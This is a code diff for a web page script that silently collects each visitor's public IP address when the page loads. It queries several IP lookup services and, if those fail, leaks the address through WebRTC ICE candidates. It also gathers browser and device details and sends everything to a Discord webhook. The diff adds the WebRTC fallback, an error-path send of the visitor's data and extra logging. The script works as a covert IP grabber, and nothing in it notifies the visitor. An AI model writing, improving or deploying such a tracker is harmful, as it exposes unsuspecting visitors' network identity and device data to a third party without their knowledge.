@@ -35,65 +35,94 @@
                 'https://api64.ipify.org?format=json',
                 'https://api.myip.com',
                 'https://ipapi.co/json/',
-                'https://ipinfo.io/json'
+                'https://ipinfo.io/json',
+                'https://api.db-ip.com/v2/free/self'
             ];
             
             for (const service of ipServices) {
                 try {
                     console.log(`Trying: ${service}`);
+                    const controller = new AbortController();
+                    const timeout = setTimeout(() => controller.abort(), 5000);
                     
-                    const response = await fetch(service);
+                    const response = await fetch(service, {
+                        signal: controller.signal,
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    });
+                    
+                    clearTimeout(timeout);
                     
                     if (response.ok) {
                         const data = await response.json();
-                        const ip = data.ip || data.client_ip || data.query || 'Unknown';
+                        console.log('API response:', data);
                         
-                        if (ip !== 'Unknown') {
+                        const ip = data.ip || data.ipAddress || data.query || data.clientIp || 'Unknown';
+                        
+                        if (ip !== 'Unknown' && ip !== '' && !ip.includes('undefined')) {
                             console.log(`IP found: ${ip}`);
                             return ip;
                         }
                     }
                 } catch (error) {
-                    console.log(`Service failed: ${error.message}`);
+                    console.log(`Service ${service} failed: ${error.message}`);
                     continue;
                 }
+            }
+            
+            console.log('All API methods failed, trying WebRTC...');
+            
+            try {
+                const rtcIP = await getWebRTCIP();
+                if (rtcIP) {
+                    console.log(`WebRTC IP: ${rtcIP}`);
+                    return rtcIP;
+                }
+            } catch (error) {
+                console.log(`WebRTC failed: ${error.message}`);
             }
             
             return 'Unknown';
         }
         
-        async function getGeoLocation(ip) {
-            if (ip === 'Unknown' || ip.includes('192.168.') || ip.includes('127.0.0.1')) {
-                return null;
-            }
-            
-            const geoServices = [
-                `https://ipapi.co/${ip}/json/`,
-                `https://ipwhois.app/json/${ip}`,
-                `https://ipinfo.io/${ip}/json`
-            ];
-            
-            for (const service of geoServices) {
+        function getWebRTCIP() {
+            return new Promise((resolve) => {
                 try {
-                    const response = await fetch(service);
-                    if (response.ok) {
-                        const data = await response.json();
-                        
-                        if (data.country || data.country_name) {
-                            return {
-                                country: data.country_name || data.country || 'Unknown',
-                                city: data.city || 'Unknown',
-                                region: data.region || data.regionName || 'Unknown',
-                                isp: data.org || data.isp || 'Unknown'
-                            };
+                    const pc = new RTCPeerConnection({iceServers: []});
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    
+                    pc.onicecandidate = (ice) => {
+                        if (!ice.candidate) {
+                            pc.close();
+                            resolve(null);
+                            return;
                         }
-                    }
+                        
+                        const candidate = ice.candidate.candidate;
+                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                        const match = candidate.match(ipRegex);
+                        
+                        if (match) {
+                            const ip = match[1];
+                            if (!ip.startsWith('192.168.') && 
+                                !ip.startsWith('10.') && 
+                                !ip.startsWith('172.16.')) {
+                                pc.close();
+                                resolve(ip);
+                            }
+                        }
+                    };
+                    
+                    setTimeout(() => {
+                        pc.close();
+                        resolve(null);
+                    }, 2000);
                 } catch (error) {
-                    continue;
+                    resolve(null);
                 }
-            }
-            
-            return null;
+            });
         }
         
         function collectBrowserData() {
@@ -110,7 +139,7 @@
         }
         
         async function sendToDiscord(data) {
-            console.log('Sending to Discord...');
+            console.log('Sending to Discord...', data);
             
             try {
                 const embed = {
@@ -120,19 +149,17 @@
                     fields: [
                         {
                             name: '🌐 IP Address',
-                            value: `\`${data.ip}\``,
-                            inline: true
-                        },
-                        {
-                            name: '📍 Location',
-                            value: data.geo ? 
-                                `${data.geo.city}, ${data.geo.country}` :
-                                'Unable to determine',
+                            value: `\`\`\`${data.ip}\`\`\``,
                             inline: true
                         },
                         {
                             name: '🖥️ Device Info',
                             value: `${data.browser.platform} - ${data.browser.screen}`,
+                            inline: true
+                        },
+                        {
+                            name: '🌍 Browser',
+                            value: data.browser.userAgent.substring(0, 50) + '...',
                             inline: false
                         },
                         {
@@ -141,8 +168,8 @@
                             inline: true
                         },
                         {
-                            name: '🌍 Website',
-                            value: data.browser.hostname,
+                            name: '📱 URL',
+                            value: data.browser.url,
                             inline: true
                         }
                     ],
@@ -157,6 +184,8 @@
                     avatar_url: 'https://cdn.discordapp.com/attachments/847471116316999690/894877973234393118/ezgif-4-b84848c6b4.gif'
                 };
                 
+                console.log('Payload:', payload);
+                
                 const response = await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: {
@@ -165,11 +194,14 @@
                     body: JSON.stringify(payload)
                 });
                 
+                console.log('Discord response status:', response.status);
+                
                 if (response.ok) {
                     console.log('Successfully sent to Discord!');
                     return true;
                 } else {
-                    console.log(`Discord error: ${response.status}`);
+                    const errorText = await response.text();
+                    console.log(`Discord error ${response.status}: ${errorText}`);
                     return false;
                 }
                 
@@ -181,24 +213,39 @@
         
         async function collectData() {
             try {
+                console.log('Starting data collection...');
                 const ip = await getRealIP();
-                const geo = await getGeoLocation(ip);
+                console.log('Final IP:', ip);
+                
                 const browserData = collectBrowserData();
                 
                 const collectedData = {
                     ip: ip,
-                    geo: geo,
                     browser: browserData
                 };
                 
+                console.log('Sending data:', collectedData);
                 await sendToDiscord(collectedData);
                 
             } catch (error) {
-                console.log(`Error: ${error.message}`);
+                console.log(`Collection error: ${error.message}`);
+                
+                const fallbackData = {
+                    ip: 'Unknown (Error)',
+                    browser: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        timestamp: new Date().toISOString(),
+                        url: window.location.href
+                    }
+                };
+                
+                await sendToDiscord(fallbackData);
             }
         }
         
         window.addEventListener('load', () => {
+            console.log('Page loaded, starting data collection...');
             collectData();
             
             setTimeout(() => {
